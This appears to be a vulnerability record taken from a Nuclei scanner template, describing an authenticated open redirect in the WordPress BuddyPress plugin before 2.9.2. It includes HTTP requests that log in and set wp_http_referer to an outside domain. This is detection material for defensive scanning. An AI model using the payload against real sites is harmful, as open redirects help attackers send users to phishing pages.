# Vulnerability: WordPress BuddyPress < 2.9.2 - Authenticated Open Redirect
**Classification:** CWE-601
**Source:** Nuclei Template (`wp-buddypress-open-redirect.yaml`)

## Description
WordPress BuddyPress plugin before 2.9.2 contains an authenticated open redirect vulnerability via the wp_http_referer parameter on the bp-profile-edit admin page. After updating profile, the Back to Users link redirects to the attacker-specified URL.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/users.php?page=bp-profile-edit&wp_http_referer=https%3A%2F%2Foast.pro&updated=1 HTTP/1.1
Host: {{Hostname}}
```

